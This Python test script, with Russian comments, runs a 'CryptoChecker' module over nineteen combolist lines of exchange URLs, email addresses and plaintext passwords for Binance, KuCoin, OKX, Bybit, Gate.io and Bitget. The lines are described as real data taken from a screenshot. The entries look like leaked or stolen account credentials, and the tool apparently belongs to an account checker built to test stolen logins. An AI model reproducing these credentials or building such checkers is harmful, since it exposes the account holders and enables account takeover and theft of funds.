# -*- coding: utf-8 -*-
"""
Полный тест через checker.check() — все форматы со скриншота
"""
import asyncio
import aiohttp
import sys
sys.path.insert(0, ".")
from checkers.crypto_checker import CryptoChecker

# Реальные строки со скриншота
LINES = [
    "kucoin.com:151951:Gregre20",
    "accounts.binance.com/pt/login:9314177:laranjeirA228230",
    "okx.com/join/26369401:password:@realwawonee89",
    "accounts.binance.com/en/login:0348578l840:Naeem.123:Channel",
    "com.binance.dev:/mobyevansjones@gmail.com:@",
    "futures.kucoin.com:gececi164@gmail.com:21532456s",
    "accounts.kucoin.com/es-la/register:jorekina@gmail.com:jorekina@92",
    "accounts.binance.com/es-AR/register:clearwaterservicios@gmail.com:%6E[p",
    "com.binance.com:arsalbaba2003@gmail.com:Ars12m0316",
    "kucoin.com/ucenter/signin:crysthianmarcos87@gmail.com:23%kucoin%6052",
    "accounts.binance.com:zkkaa707@gmail.com:Sk<3As??",
    "gate.io:/neko1325:Fuckchina",
    "bybit.com/en-us/register:dillonirussell@gmail.com:cerat1423",
    "gate.io:skuba21@gmail.com:@lencia2020",
    "binance.com:fahidxx999@gmail.com:Adgjmp1998@",
    "kucoin.com/:AMIIIR.02@gmail.com:10am12i168ir",
    "bitget.com:zeeabbas744@gmail.com:zee3213210",
    "accounts.binance.com/es/login-password:darwinlopez679@gmail.com:1089907396Lopez",
    "accounts.binance.com:zeoqeli01@gmail.com:Nattawatpeo00",
]

async def main():
    checker = CryptoChecker()
    print("=" * 80)
    print("🧪 ПОЛНЫЙ ТЕСТ ЧЕРЕЗ checker.check()")
    print("=" * 80)

    ok_count = 0
    fail_count = 0

    async with aiohttp.ClientSession() as session:
        for line in LINES:
            result = await checker.check(line, timeout=5, session=session)
            info = result.get("info", {})
            login = info.get("login", "")
            password = info.get("password", "")
            rtype = result.get("type", "unknown")
            exchange = result.get("exchange", "")

            has_creds = bool(login or password)
            status = "✅" if has_creds else "❌"
            if has_creds:
                ok_count += 1
            else:
                fail_count += 1

            print(f"{status} [{exchange or rtype}] {line[:55]}")
            print(f"     Login: {login!r}  |  Pass: {password!r}")

    print(f"\n{'='*80}")
    print(f"📊 ИТОГ: {ok_count}/{len(LINES)} с credentials  |  {fail_count} без credentials")
    print("=" * 80)

asyncio.run(main())
